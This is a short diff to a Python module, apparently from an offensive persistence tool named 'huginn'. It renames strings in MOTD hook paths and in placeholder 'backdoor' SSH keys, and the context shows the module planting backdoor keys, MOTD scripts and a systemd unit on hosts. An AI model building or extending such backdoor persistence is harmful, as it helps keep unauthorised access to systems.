@@ -1,4 +1,4 @@
-# app/core/ssh_persistence.py
+﻿# app/core/ssh_persistence.py
 import os
 import time
 import base64
@@ -364,8 +364,8 @@ WantedBy=multi-user.target
             
             # Try different MOTD locations
             motd_locations = [
-                '/etc/update-motd.d/99-huggin',
-                '/etc/motd.d/99-huggin',
+                '/etc/update-motd.d/99-huginn',
+                '/etc/motd.d/99-huginn',
                 '~/.motd'
             ]
             
@@ -471,7 +471,7 @@ Host *
             # In a real implementation, you'd use proper cryptographic libraries
             
             # For demonstration, create a placeholder key
-            public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... huggin-backdoor@persistence"
+            public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... huginn-backdoor@persistence"
             private_key = """-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAFwAAAAdzc2gtcn
 ...
@@ -482,7 +482,7 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAFwAAAAdzc2gtcn
         except Exception as e:
             # Fallback to a basic key format
             return (
-                "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ huggin-backdoor",
+                "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ huginn-backdoor",
                 "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
             )
     
